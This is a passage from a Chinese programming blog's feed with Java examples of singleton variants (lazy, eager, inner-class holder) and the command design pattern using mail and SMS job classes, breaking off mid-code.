&lt;/span>&lt;span style="color:#75715e"> * 面临并发安全问题,可能会创建多个实例
&lt;/span>&lt;span style="color:#75715e"> * 需要对方法进行同步.(独占锁)
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return obj
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> SingletonLazyMode &lt;span style="color:#a6e22e">getSingleton&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 在判断处可能发生并发安全问题.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>shm &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> shm&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
shm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SingletonLazyMode&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> shm&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="饿汉式">饿汉式&lt;/h3>
&lt;p>饿汉式与懒汉式刚好是一对反例。一旦饿汉式的 class 被加载且进行初始化后，单例对象就会被马上创建。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> com.designpattern.singleton&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 单例设计模式-饿汉式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SingletonHungryMode&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SingletonHungryMode shm &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SingletonHungryMode&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// 构造器
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">SingletonHungryMode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 返回实例对象
&lt;/span>&lt;span style="color:#75715e"> * 饿汉式避免了并发安全问题,但是却无法实现lazyLoad
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SingletonHungryMode &lt;span style="color:#a6e22e">getSingleton&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> shm&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>饿汉式对象无法实现 lazy-load。当类被反射调用或设置读取类的静态字段以及执行某个静态方法时，类的静态成员变量就会被初始化。&lt;/p>
&lt;h3 id="innerclass-holder">innerclass holder&lt;/h3>
&lt;p>配合静态内部类实现的单例模式。即使外部类的任何成员被访问，持有外部类单例对象的内部类，直到 getInstance 方法被调用为止，都不会被初始化。
这种模式即实现了 lazy-load，又避免了普通懒汉式的并发安全问题。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#f92672">package&lt;/span> com.designpattern.singleton&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 单例设计模式-innerclass holder
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SingletonInnerMode&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 私有化构造器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">SingletonInnerMode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 持有外部类对象的引用.
&lt;/span>&lt;span style="color:#75715e"> * 每次被初始化后,sim只会被加载一次.
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SingletonInnerHolder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SingletonInnerMode sim &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SingletonInnerMode&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 私有化构造器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#a6e22e">SingletonInnerHolder&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 获取单例对象.
&lt;/span>&lt;span style="color:#75715e"> * getInstance被调用时候,内部类才会被加载
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @return
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> SingletonInnerMode &lt;span style="color:#a6e22e">getInstanse&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 访问成员变量时,内部类的静态成员变量才被初始化
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> SingletonInnerHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sim&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>在大多数项目中，如果你对性能不是要求特别苛刻，饿汉式可以满足我们的需求。如果你喜欢 lazy-load，那么普通的懒汉式在大部分项目中也完全够用。innerclass holder 实现很巧妙，如果你的某个类在初始化时会进行大量运算，则推荐使用它来解决问题。&lt;/p></description></item><item><title>命令设计模式</title><link>https://www.chucklin.net/post/command_designmode/</link><pubDate>Fri, 19 Jan 2018 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/command_designmode/</guid><description>&lt;h2 id="什么是命令设计模式">什么是命令设计模式&lt;/h2>
&lt;p>通过将“请求”封装成命令对象，来将操作的请求者与操作的执行者解耦，以便使用不同的请求队列或者日志来参数化其他对象，命令模式也支持可撤销的操作。&lt;/p>
&lt;h2 id="为什么要使用命令设计模式">为什么要使用命令设计模式&lt;/h2>
&lt;p>试想下面一种业务场景。
现在拥有一个中间件，名称为 cache。这个 cache 承担了异步向用户外发送邮件与短信的功能。
系统中已经有设计好的独立的邮件与短信对象，如下：
&lt;img src="http://static.zybuluo.com/mikumikulch/y9nrghiqrr04y4wrnvkog542/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-12-27%20%E4%B8%8B%E5%8D%882.33.36.png" alt="屏幕快照 2016-12-27 下午2.33.36.png-16.4kB">
发送一封邮件要比发送短信复杂的多。所以，MAIL 对象相对于 SMS 对象要复杂不少。除了 title 与 body 以外，还可以设置邮件的附件。&lt;/p>
&lt;p>现在让我们开始设计中间件的具体逻辑。我的思路很清晰：首先设计一个中间件。为了能够快速的从容器中获取和添加对象，我们采用 LinkedList 对象。
然后将发邮件与发短信的任务逐个添加进 cache 中，最后循环 cache，做出相应处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 发送邮件
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MAIL&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailTitle&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件标题&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailBody&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件内容&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailAttachment&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件附件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendMail&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送邮件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMS&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMsg&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置短信内容&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendSms&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.util.LinkedList&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.util.List&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 命令设计模式
&lt;/span>&lt;span style="color:#75715e"> * 中间件任务执行器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">JobExecuter&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> caches &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LinkedList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 执行中间件任务
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">executeJobs&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Object cache &lt;span style="color:#f92672">:&lt;/span> caches&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>cache &lt;span style="color:#66d9ef">instanceof&lt;/span> MAIL&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>MAIL&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setMailTitle&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>MAIL&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setMailBody&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>MAIL&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setMailAttachment&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>MAIL&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">sendMail&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>cache &lt;span style="color:#66d9ef">instanceof&lt;/span> SMS&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>SMS&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">setMsg&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">((&lt;/span>SMS&lt;span style="color:#f92672">)&lt;/span> cache&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">sendSms&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
caches&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> MAIL&lt;span style="color:#f92672">());&lt;/span>
caches&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> SMS&lt;span style="color:#f92672">());&lt;/span>
executeJobs&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了简明扼要的说明设计模式，我们省略了各种线程任务的创建执行代码。
任务已经顺利完成了，中间件能够根据任务类型自动判断不同的业务，并顺利完成需求。&lt;/p>
&lt;p>遗憾的是，这样的设计拥有一些“重大缺陷”。&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>请求与执行的耦合度很高。假设需要再增加一个推送 app 消息的业务，那么你的代码很快就会陷入 if else 的海洋。&lt;/li>
&lt;li>类没有对扩展开发，对修改关闭。当需求变化时我们仅仅能够通过修改代码来应对。&lt;/li>
&lt;li>executeJobs() 是一个典型的依赖具体对象，而不是接口或抽象的失败案例。&lt;/li>
&lt;li>如果我们想要将发送给某 1 个用户的消息一起执行，应该怎么办？&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>好消息是，命令设计模式能够帮助我们解决上面的所有问题。
在学习命令设计模式之前，我们先试着用餐厅就餐这个日常生活中的行为，来接近命令设计模式。
当我们在餐厅就餐时，我们往往会先向服务员点餐，然后通过服务员把点好的餐点送往后厨，并通知后厨根据新订单准备餐点。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-flow" data-lang="flow">client=&amp;gt;start: 客户
waiter=&amp;gt;operation: 服务员
createOrders=&amp;gt;operation: 点餐（createOrders）
notifyChef=&amp;gt;operation: 通知后厨
chef=&amp;gt;end: 准备餐点
client-&amp;gt;createOrders-&amp;gt;waiter-&amp;gt;notifyChef-&amp;gt;chef
&lt;/code>&lt;/pre>&lt;p>通过点餐创建的订单，屏蔽了不同的客户的不同需求。对于 waiter 来说，不需要知道订单的具体内容。只需要将客户的点餐订单传递给后厨，并通知后厨任务就算完成了。后厨通过订单内容，着手准备工作。&lt;/p>
&lt;h4 id="从餐厅到命令设计模式">从餐厅到命令设计模式&lt;/h4>
&lt;p>将餐厅想象成 OO 设计模式的一种模型。客户就相当于 client、点餐的动作就相当于创建请求、服务员就相当于异步中间件、后厨则是真正 action 的执行者。
好了，让我们根据这样的思路重新设计之前的需求。
&lt;img src="http://static.zybuluo.com/mikumikulch/hgbkpn28eidao2l9kwh3bl89/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-12-27%20%E4%B8%8B%E5%8D%884.37.55.png" alt="屏幕快照 2016-12-27 下午4.37.55.png-44.8kB">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 命令设计模式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">interface&lt;/span> &lt;span style="color:#a6e22e">Command&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">execute&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 发送邮件
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MAIL&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Command &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailTitle&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件标题&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailBody&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件内容&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMailAttachment&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置邮件附件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendMail&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送邮件&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">execute&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
setMailAttachment&lt;span style="color:#f92672">();&lt;/span>
setMailBody&lt;span style="color:#f92672">();&lt;/span>
setMailTitle&lt;span style="color:#f92672">();&lt;/span>
sendMail&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 命令设计模式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SMS&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Command &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setMsg&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;设置短信内容&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sendSms&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;发送短信&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">execute&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
setMsg&lt;span style="color:#f92672">();&lt;/span>
sendSms&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.util.LinkedList&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> java.util.List&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 命令设计模式
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">CommandInvoker&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Command&lt;span style="color:#f92672">&amp;gt;&lt;/span> caches &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LinkedList&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 设置Invoker所需要的命令
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param e
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">addCommand&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Command e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
